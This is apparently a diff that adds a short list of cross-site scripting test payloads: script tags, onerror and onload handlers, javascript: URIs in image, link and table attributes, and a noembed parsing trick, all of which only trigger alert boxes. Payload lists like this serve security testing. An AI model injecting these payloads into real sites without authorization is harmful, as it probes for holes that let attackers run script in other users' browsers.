@@ -1,0 +1,9 @@
+<img src=”x” onerror=alert(1)>
+javascript:alert(1)
+onmouseover=alert(1)
+<script>alert(1);</script>
+window.location.href="www.google.com"
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<noembed> <img src="</noembed><iframe onload=alert(1)>"/> </noembed>
